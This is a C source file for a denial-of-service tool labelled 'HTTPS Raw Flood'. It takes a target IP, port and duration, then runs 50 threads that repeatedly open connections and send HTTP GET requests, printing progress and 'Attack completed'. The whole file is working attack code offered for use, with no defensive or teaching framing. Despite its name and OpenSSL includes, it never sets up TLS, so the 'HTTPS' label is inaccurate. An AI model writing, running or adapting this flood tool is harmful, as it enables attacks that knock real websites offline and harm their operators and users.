#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_THREADS 50

// HTTP/1.1 GET request
char *http_request = 
    "GET / HTTP/1.1\r\n"
    "Host: %s\r\n"
    "User-Agent: Mozilla/5.0\r\n"
    "Accept: text/html,application/xhtml+xml\r\n"
    "Accept-Language: en-US,en;q=0.5\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Connection: keep-alive\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "\r\n";

void *https_flood(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    time_t start = time(NULL);
    unsigned long requests = 0;
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &server_addr.sin_addr);
        
        // Conectar rápidamente
        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        // Enviar request HTTP
        char request[1024];
        snprintf(request, sizeof(request), http_request, ip);
        send(sock, request, strlen(request), 0);
        
        // Pequeña pausa y cerrar
        usleep(10000);
        close(sock);
        
        requests++;
        
        if(requests % 100 == 0) {
            printf("[HTTPS-RAW] Thread: %lu requests to %s:%d\n", requests, ip, port);
        }
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("HTTPS Raw Flood - Layer 7 HTTP Flood\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    printf("[HTTPS-RAW] Starting HTTP flood on %s:%d\n", argv[1], atoi(argv[2]));
    
    pthread_t threads[MAX_THREADS];
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, https_flood, argv + 1);
    }
    
    sleep(atoi(argv[3]));
    
    printf("[HTTPS-RAW] Attack completed\n");
    return 0;
}
